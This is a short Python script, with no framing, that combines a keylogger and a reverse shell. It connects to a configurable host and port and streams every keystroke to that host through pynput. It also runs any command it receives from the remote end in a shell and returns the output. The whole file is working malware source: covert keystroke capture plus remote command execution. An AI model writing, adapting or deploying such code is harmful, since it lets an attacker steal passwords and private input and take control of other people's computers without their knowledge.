import socket
import subprocess
import threading
from pynput import keyboard

ip_address = '127.0.0.1'
port_number = 1234

def start_keylogger(cs):
    def on_press(key):
        try:
            cs.send(f"{key.char}".encode())
        except AttributeError:
            cs.send("")
            #cs.send(f"[{key}]".encode())

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def connect_to_server():
    cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cs.connect((ip_address, port_number))

    threading.Thread(target=start_keylogger, args=(cs,), daemon=True).start()

    while True:
        try:
            command = cs.recv(1024).decode()
            if command.lower() == 'quit':
                break
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                cs.send(output.encode())
        except Exception as e:
            cs.send(f"Error: {e}".encode())
            break

    cs.close()

if __name__ == "__main__":
    connect_to_server()
